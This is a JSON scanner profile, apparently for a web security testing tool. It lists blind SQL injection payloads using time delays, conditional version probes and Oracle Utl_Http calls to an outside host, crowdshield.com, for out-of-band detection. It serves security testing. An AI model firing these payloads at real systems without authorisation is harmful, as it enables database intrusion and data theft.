[{"Name":"ACTIVE - SQL Injection (Blind)","Enabled":true,"Scanner":1,"Payloads":["\u0027 OR SLEEP(5)--","1\u0027 OR SLEEP(5)--","x\u0027 OR SLEEP(5)--","1\" OR SLEEP(5)--","x\u0027 waitfor delay \u00270:0:10\u0027--","1 waitfor delay \u00270:0:10\u0027--","1||Utl_Http.request(\u0027https://crowdshield.com/.injectx/r.php?sqli\u0027) from dual--","1\u0027||Utl_Http.request(\u0027https://crowdshield.com/.injectx/r.php?sqli\u0027) from dual--","1\u0027) AND SLEEP(5) AND (\u0027x\u0027\u003d\u0027x","1\") AND SLEEP(5) AND (\"x\"\u003d\"x","1 AND SLEEP(5)","x AND SLEEP(5)","1 AND waitfor delay \u00270:0:10\u0027","X AND waitfor delay \u00270:0:10\u0027","(select*from(select(sleep(20)))a)","1-sleep/*f*/(10)","1-if(mid(version/*f*/(),1,1)\u003d5,sleep/*f*/(5),0)","1-if(mid(version/*f*/(),1,1)\u003d4,sleep/*f*/(5),0)","1\u0027+AND+SLEEP(5)+AND+\u0027aaxA\u0027\u003d\u0027aaxA","test\u0027 RLIKE (SELECT (CASE WHEN (9203\u003d9203) THEN 0x74657374 ELSE 0x28 END))-- YOJb"],"Encoder":["URL-encode key characters"],"UrlEncode":false,"CharsToUrlEncode":"","Grep":["INJECTX321"],"PayloadResponse":false,"NotResponse":false,"isTime":false,"iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"isurlextension":false,"NegativeUrlExtension":false,"MatchType":1,"RedirType":4,"MaxRedir":5,"payloadPosition":1,"payloadsFile":"","grepsFile":"","IssueName":"SQL Injection (Blind Based)","IssueSeverity":"High","IssueConfidence":"Tentative","IssueDetail":"SQL Injection (Blind Based)","RemediationDetail":"SQL Injection (Blind Based)","IssueBackground":"SQL Injection (Blind Based)","RemediationBackground":"SQL Injection (Blind Based)","Scantype":0,"pathDiscovery":false}]